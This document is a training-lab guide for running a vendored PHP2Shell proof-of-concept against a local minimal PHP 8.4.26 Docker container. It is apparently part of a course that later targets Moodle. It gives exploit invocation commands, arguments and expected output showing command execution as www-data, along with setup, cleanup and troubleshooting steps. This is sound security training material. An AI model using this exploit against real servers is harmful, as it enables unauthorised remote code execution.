# Lab 0: Upstream Minimal Target

## Purpose

This Lab proves that the vendored PHP2Shell PoC works before you touch the full Moodle application. The target is the upstream minimal PHP page, not Moodle.

You will:

1. Start the upstream target.
2. Confirm that it serves the expected page.
3. Run the PoC against it.
4. Get a new `uid=33(www-data)` proof.
5. Stop the target.

The minimal target is separate from the Moodle Lab on port 8080. Do not mix the two container IDs or profiles.

## Prerequisites

- Docker and Docker Compose are working.
- The repository was cloned, and you are in the project root.
- Port `8088` is free.

The upstream target is in `php2shell/docker/`. It uses:

- PHP `8.4.26-apache`
- `linux/amd64`
- `php2shell-target` as the container name
- port `127.0.0.1:8088`
- the minimal page `<?php echo "OK\n"; ?>`

The course Compose file adds `setarch -R` and `seccomp=unconfined` as a Lab adaptation. The public PoC's cookie parser accepts `0x7f...` pointers; Codespaces may map libraries around `0x7b...`, so pinning the address space keeps Lab 0 reproducible. The exploit still performs its heap and libphp leaks. This is not an ASLR-bypass claim.

## Steps

### 1. Start the target

```sh
cd php2shell/docker
docker compose up -d
cd ../..
```

### 2. Confirm HTTP and the page

```sh
curl -s -o /dev/null -w '%{http_code}\n' http://127.0.0.1:8088/
curl -s http://127.0.0.1:8088/
```

Expected:

```text
200
OK
```

Check the image and container:

```sh
docker compose -f php2shell/docker/docker-compose.yml ps -q target
docker inspect --format '{{.Config.Image}}' \
  "$(docker compose -f php2shell/docker/docker-compose.yml ps -q target)"
```

Expected image: `php:8.4.26-apache`.

### 3. Read the PoC arguments

```sh
python3 php2shell/exploit.py --help
```

The important arguments for this Lab:

- `-u`: target URL, `http://127.0.0.1:8088/`.
- `--docker-container`: the local target container ID, used only to read `libphp.so` and calculate offsets.
- `--proof-file`: a file on your host that receives the proof text.
- `-c`: the command to run on the target. The limit is 14 bytes.

The default profile is `official`, which matches PHP 8.4.26. Do not use `official83` here; that profile is for the Moodle Lab.

### 4. Run the PoC

```sh
TARGET=$(docker compose -f php2shell/docker/docker-compose.yml ps -q target)
rm -f php2shell/out/p1

python3 php2shell/exploit.py \
  -u http://127.0.0.1:8088/ \
  --docker-container "$TARGET" \
  --proof-file php2shell/out/p1 \
  -c 'id>/out/p1'

cat php2shell/out/p1
```

Expected output includes:

```text
PROOF: uid=33(www-data) gid=33(www-data) groups=33(www-data)
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

The proof file is on the host because `php2shell/docker/docker-compose.yml` mounts `php2shell/out/` at `/out`. The command ran inside the target container as `www-data`.

## How to read the result

- `uid=33(www-data)` is execution evidence from the target, not a host command.
- The target is a minimal PHP page. It does not have Moodle, MariaDB, or the Moodle baseline.
- `--docker-container` is not a remote attack option; it only reads the local container's `libphp.so` to calculate offsets.
- The 14-byte `-c` limit is a PoC constraint. The later Flag Lab works within it using multiple short steps.

## Stop the target

`stop` keeps the container and its filesystem but stops the process:

```sh
cd php2shell/docker
docker compose stop
cd ../..
```

`down` removes the container and network but normally keeps named volumes:

```sh
cd php2shell/docker
docker compose down
cd ../..
```

`docker stop <container>` stops one container by ID. Do not use `down -v` on the Moodle Lab; it deletes the Moodle volumes and the Flag. The minimal target does not use Moodle data, so removing its container is safe.

## Cleanup

```sh
rm -f php2shell/out/p1 php2shell/out/offsets.env
```

The next run recreates `offsets.env`.

## Troubleshooting

| Symptom | Check |
|---|---|
| `Connection refused` on 8088 | `docker compose -f php2shell/docker/docker-compose.yml ps`; start the target |
| `TARGET` is empty | Run `docker compose -f php2shell/docker/docker-compose.yml ps -q target` from the project root |
| `HEAP_LEAK_FAILED` | Confirm the image is `php:8.4.26-apache`, port 8088, and `uname -m` is `x86_64` |
| `EXPLOIT_FAILED` but no proof | Confirm `--proof-file php2shell/out/p1` and `-c 'id>/out/p1'` |
| Proof is old | `rm -f php2shell/out/p1` before running |
| Port 8088 in use | Stop the other service or change the port in `php2shell/docker/docker-compose.yml`; keep the URL and PoC target in sync |
